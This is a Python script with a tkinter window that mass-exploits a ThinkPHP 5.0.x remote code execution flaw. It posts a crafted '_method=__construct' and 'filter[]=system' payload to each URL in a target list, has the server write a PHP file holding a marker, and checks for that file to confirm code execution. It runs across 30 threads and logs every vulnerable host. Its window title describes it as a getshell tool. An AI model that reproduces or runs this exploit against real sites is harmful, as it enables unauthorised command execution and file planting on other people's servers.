import requests
import json
from tkinter import *
from PIL.ImageTk import PhotoImage
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def post_command(host):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    data = {
        "_method": "__construct",
        "filter[]": "system",
        "method": "get",
        "server[REQUEST_METHOD]": "echo 202cb962ac59075b964b07152d234b70 > 11.php"
    }
    target = host + "/public/index.php?s=captcha"
    r = requests.post(target, data=data, headers=headers)
    return True
def md5_file_is_exist(host):
    rs = requests.get(host+"/public/11.php")
    if rs.status_code == 200 and "202cb962ac59075b964b07152d234b70" in rs.text:
        return True
def Thinkphp_5_0_x_getshell_exp(url):
    try:
        post_command(url)
        if md5_file_is_exist(url):
            pocurl = url + "/public/11.php"
            Thinkphp_5_0_x_getshell_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + pocurl + "\n")
            Thinkphp_5_0_x_getshell_text.see(END)
            with open("[exists]Thinkphp_5_0_x_getshell_url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            Thinkphp_5_0_x_getshell_text.insert(END, "[×]URL without vulnerability:" + url + "\n")
            Thinkphp_5_0_x_getshell_text.see(END)
    except Exception as err:
        Thinkphp_5_0_x_getshell_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        Thinkphp_5_0_x_getshell_text.see(END)
def get_Thinkphp_5_0_x_getshell_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def Thinkphp_5_0_x_getshell_gui():
    Thinkphp_5_0_x_getshell = Toplevel()
    Thinkphp_5_0_x_getshell.geometry("1035x455")
    Thinkphp_5_0_x_getshell.title("Thinkphp 5.0.x pass kill gethell [auto-muti-exp]    (The actual test effect is not very good, but it can be used for detection)")
    Thinkphp_5_0_x_getshell.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    Thinkphp_5_0_x_getshell.tk.call('wm', 'iconphoto', Thinkphp_5_0_x_getshell._w, logo)
    global Thinkphp_5_0_x_getshell_text
    Thinkphp_5_0_x_getshell_text = scrolledtext.ScrolledText(Thinkphp_5_0_x_getshell,width=123, height=25)
    Thinkphp_5_0_x_getshell_text.grid(row=0, column=0, padx=10, pady=10)
    Thinkphp_5_0_x_getshell_text.see(END)
    addrs = get_Thinkphp_5_0_x_getshell_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(Thinkphp_5_0_x_getshell_exp, addr)
    Thinkphp_5_0_x_getshell.mainloop()